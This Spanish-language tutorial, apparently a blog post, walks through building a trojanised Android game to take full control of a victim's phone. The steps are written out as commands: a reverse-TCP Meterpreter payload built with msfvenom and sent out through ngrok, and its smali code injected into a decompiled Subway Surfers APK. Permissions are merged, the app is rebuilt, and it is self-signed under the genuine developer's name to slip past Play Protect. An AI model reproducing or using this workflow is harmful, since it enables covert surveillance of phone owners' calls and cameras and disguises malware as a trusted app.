<p>Este artículo va orientado a enseñar paso a paso como un atacante puede ganar acceso total a un dispositivo android, acceso total me refiero des de poder ver el registro de llamadas a poder sacar fotos con las cámaras del teléfono móvil.</p>

<p><strong>ngrok</strong></p>

<p>Ngrok nos permite exponer a internet una URL generada dinámicamente, la cual apunta a un servicio web que se está ejecutando en nuestra máquina local. Por ejemplo: si tenemos un servicio web arrancado en http://localhost:8080, ngrok genera dinámicamente una URL del tipo http://xxxxxx.ngrok.io visible en internet, y que apunta directamente a nuestro localhost. De esta forma evitaremos tener que configurar un puerto en el router y por seguridad, evitaremos exponer nuestra IP pública.</p>

<p>No es necesario instalarlo, se puede utilizar el binario ejecutable, solamente se tiene que descargar:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
unzip ngrok-stable-linux-amd64.zip
./ngrok
</code></pre></div></div>

<p>Si no lo tenias configurado de antes, para poder utilizarlo necesitarás un token, para conseguir este token, tendrás que loggearte en la web oficial de ngrok:</p>

<ul>
  <li><a href="https://dashboard.ngrok.com/login">https://dashboard.ngrok.com/login</a></li>
</ul>

<p>Cuando ya estés loggeado, en la siguiente URL podrás ver tu token:</p>

<ul>
  <li><a href="https://dashboard.ngrok.com/get-started/your-authtoken">https://dashboard.ngrok.com/get-started/your-authtoken</a></li>
</ul>

<p>Ahora que ya tenemos el token, tendremos que hacer que ngrok des de nuestra máquina lo tenga en cuenta y nos permita ejecutar comandos, para ello:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./ngrok authtoken <span class="s2">"token"</span>
</code></pre></div></div>

<p>Con esto, ya podremos utilizar ngrok.</p>

<p><strong>Iniciar ngrok</strong></p>

<p>Para iniciarlo, simplemente tenemos que ejecutar el siguiente comando:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./ngrok tcp 1234
</code></pre></div></div>

<p>Con esto, se abrirá</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">ngrok by @inconshreveable                                                                                                                                                  (Ctrl+C to quit)
                                                                                                                                                                                           
Session Status                online                                                                                                                                                       
Account                       example@gmail.com (Plan: Free)                                                                                                           
Version                       2.3.40                                                                                                                                                       
Region                        United States (us)                                                                                                                                           
Web Interface                 http://127.0.0.1:4040                                                                                                                                        
</span><span class="gp">Forwarding                    tcp://8.tcp.ngrok.io:11398 -&gt;</span><span class="w"> </span>localhost:1234                                                                                                                 
<span class="go">                                                                                                                                                                                           
Connections                   ttl     opn     rt1     rt5     p50     p90                                                                                                                  
                              0       0       0.00    0.00    0.00    0.00
</span></code></pre></div></div>

<p><strong>Archivo apk malicioso</strong></p>

<p>Utilizaremos metasploit ya que tiene modulos específicos para el caso, utilizaremos msfvenom para generar el archivo apk, con las siguientes especificaciones:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> android/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>8.tcp.ngrok.io <span class="nv">LPORT</span><span class="o">=</span>11398 <span class="nt">-o</span> metasploit.apk
</code></pre></div></div>

<p>Es importante tener en cuenta que si en algún momento se cierra ngrok, será necesario generar de nuevo el payload con lo que pertoque ya que cada vez que se inicia, cambia de servidor tcp, en LHOST, se tiene que especificar el servidor tcp, el cual está en escucha por el puerto 11398 y al mismo tiempo está redirigiendo el tráfico a nuestro equipo al puerto 1234, es importante tener esto en cuenta ya que si se configura mal no funcionará.</p>

<p><strong>Descarga de apk legítimo</strong></p>

<p>El primero paso es descargarse un archivo APK, en nuestro caso utilizaremos la siguiente web:</p>

<ul>
  <li><a href="https://www.apkmonk.com/app/com.kiloo.subwaysurf/">https://www.apkmonk.com/app/com.kiloo.subwaysurf/</a></li>
</ul>

<p>Por mi parte voy a utilizar el juego Subway Surfers, pero debería funcionar en cualquier APK sin problema.</p>

<p>En este punto deberíamos tener 2 archivos apk, el apk de metasploit y el del juego en cuestión.</p>

<p>Para descomprimir los 2 apk’s, utilizaremos la herramienta <code class="language-plaintext highlighter-rouge">apktool</code>:</p>

<p>*<a href="https://github.com/iBotPeaches/Apktool/releases/tag/v2.4.1">https://github.com/iBotPeaches/Apktool/releases/tag/v2.4.1</a></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>java <span class="nt">-jar</span> apktool_2.4.1.jar d metasploit.apk
java <span class="nt">-jar</span> apktool_2.4.1.jar d subway.apk
</code></pre></div></div>
<p>Cuando estos 2 comandos finalices, deberían haberse creado 2 archivos con el nombre del apk (metasploit y subway).</p>

<p>Dentro de cada carpeta, tiene que haber la ruta <code class="language-plaintext highlighter-rouge">smali/com</code>, dentro de esta ruta es donde introduciremos el malware. En la carpeta de metasploit, solo se habrá creado un directorio (en smali/com), llamado metasploit. Tendremos que copiar los archivos, estando en la ruta <code class="language-plaintext highlighter-rouge">metasploit/</code>, ejecutaremos el siguiente comando:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">tar</span> <span class="nt">-cf</span> - ./smali | <span class="o">(</span> <span class="nb">cd</span> ../subway<span class="p">;</span> <span class="nb">tar</span> <span class="nt">-xpf</span> - <span class="o">)</span>
</code></pre></div></div>

<p>Con esto, lo que conseguiremos es mover todo el contenido de metasploit/smali/com a subway/smali/com.</p>

<p>Ahora nos dirigiremos a subway/ y ejecutaremos lo siguiente:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌─[root@e1abrador]─[/home/c4yyyy/Desktop/apks/subway]
└──╼ <span class="c">#grep -E 'android:name=".*?"' AndroidManifest.xml | grep MainActivity</span>
        &lt;activity android:name<span class="o">=</span><span class="s2">"com.facebook.CustomTabMainActivity"</span>/&gt;
</code></pre></div></div>

<p>Nos interesa el archiv MainActivity.smali, ya que es donde vamos a alterar el flujo del programa para, en este caso, ejecutar el malware.</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">┌─[root@OSCPath]─[/home/c4yyyy/Desktop/apks/subway/smali/com/facebook]
</span><span class="gp">└──╼ #</span><span class="nb">ls</span> | <span class="nb">grep </span>MainActivity
<span class="gp">CustomTabMainActivity$</span>1.smali
<span class="go">CustomTabMainActivity.smali
</span></code></pre></div></div>

<p>Abriremos el archivo <code class="language-plaintext highlighter-rouge">CustomTabMainActivity.smali</code> y filtraremos por <code class="language-plaintext highlighter-rouge">onCreate</code>, justo debajo de esta string, añadiremos el siguiente código:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">invoke-static {p0}, Lcom/metasploit/stage/Payload;</span>-&gt;start<span class="o">(</span>Ljava/lang/String<span class="p">;</span><span class="o">)</span>V
</code></pre></div></div>

<p>Ahora, tendremos que buscar en el directorio metasploit/ todos los “uses-permission”, que es los permisos que necesita la aplicación para funcionar:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌─[root@OSCPath]─[/home/c4yyyy/Desktop/apks/metasploit]
└──╼ <span class="c">#cat AndroidManifest.xml| grep "uses-permission"</span>
    &lt;uses-permission android:name<span class="o">=</span><span class="s2">"android.permission.INTERNET"</span>/&gt;
    &lt;uses-permission android:name<span class="o">=</span><span class="s2">"android.permission.ACCESS_WIFI_STATE"</span>/&gt;
    &lt;uses-permission android:name<span class="o">=</span><span class="s2">"android.permission.CHANGE_WIFI_STATE"</span>/&gt;
    &lt;uses-permission android:name<span class="o">=</span><span class="s2">"android.permission.ACCESS_NETWORK_STATE"</span>/&gt;
    &lt;uses-permission android:name<span class="o">=</span><span class="s2">"android.permission.ACCESS_COARSE_LOCATION"</span>/&gt;
    ...
</code></pre></div></div>
<p>Tendremos que copiar todos los que salgan y introducirlos en los del programa de subway, tendremos que asegurarnos que no se repiten:</p>

<p>Enviaremos todos los resultados de uses-permission de los 2 archivos en uno mismo, haremos:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>file.txt  | <span class="nb">sort</span> <span class="nt">-u</span>
</code></pre></div></div>
<p>Con esto se filtrarán las cadenas únicas, este output es el que necesitaremos para que se apliquen en la app todos los permisos, simplemente, en el AndroidManifest.xml de subway, se eleminarán todos los uses-permission y se substituirán por los extraidos entre los 2 archivos.</p>

<p>Esta sería la configuración del payload de la app, ahora tenemos que compilar la app:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>java <span class="nt">-jar</span> apktool_2.4.1.jar b subway <span class="nt">-o</span> malicious-subway.apk
</code></pre></div></div>
<p>Con esto ya tendríamos la app, totalmente funcional, pero hay que tener en cuenta que si la dejamos así, el “Play Protect” de android lo detectará y lo bloqueará.</p>

<p><strong>Keytool</strong></p>

<p>Para evitar el bloqueo, tenemos que autofirmar cada uno de los ficheros que componen la aplicación. Utilizaremos <code class="language-plaintext highlighter-rouge">keytool</code> para crear un keystore, para poder firmar posteriormente la aplicación.</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">keytool -genkey -v -keystore subway.keystore -alias subway -keyalg RSA -keysize 2048 -validity 10000
Introduzca la contraseña del almacén de claves: 123456
Volver a escribir la contraseña nueva: 123456
¿Cuáles son su nombre y su apellido?
  [Unknown]:  SYBO Games
¿Cuál es el nombre de su unidad de organización?
  [Unknown]:  SYBO Games
¿Cuál es el nombre de su organización?
  [Unknown]:  SYBO Games
¿Cuál es el nombre de su ciudad o localidad?
  [Unknown]:  ayyyyy
¿Cuál es el nombre de su estado o provincia?
  [Unknown]:  SYBO Games
¿Cuál es el código de país de dos letras de la unidad?
  [Unknown]:  US
¿Es correcto CN=SYBO Games, OU=SYBO Games, O=SYBO Games, L=ayyyyy, ST=SYBO Games, C=US?
  [no]:  si

Generando par de claves RSA de 2.048 bits para certificado autofirmado (SHA256withRSA) con una validez de 10.000 días
        para: CN=SYBO Games, OU=SYBO Games, O=SYBO Games, L=ayyyyy, ST=SYBO Games, C=US
[Almacenando subway.keystore]
</span></code></pre></div></div>

<p><strong>jarsigner</strong></p>

<p>Ahora ya que tenemos la archivo .keystore, ya podemos firmar la aplicación:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jarsigner <span class="nt">-verbose</span> <span class="nt">-sigalg</span> SHA1withRSA <span class="nt">-digestalg</span> SHA1 <span class="nt">-keystore</span> subway.keystore malicious-subway.apk subway
</code></pre></div></div>

<p>Nos pedirá una contraseña, tendrá que ser la que le pusimos antes, en el apartado de Keytool, en nuestro caso, 123456.</p>

<p>Finalmente, utilizaremos zipalign.</p>

<p><strong>zipalign</strong></p>

<p>Zipalign, el <code class="language-plaintext highlighter-rouge">zip aligning</code> de un apk da como resultado que todos los datos sin comprimir del apk se alineen en un limite de bytes que nosotros le especifiquemos. Con esto, el consumo de RAM será mucho menor, con esto se evitarán problemas (posibles errores de la app).</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>zipalign <span class="nt">-v</span> 4 malicious-subway.apk final.apk
</code></pre></div></div>
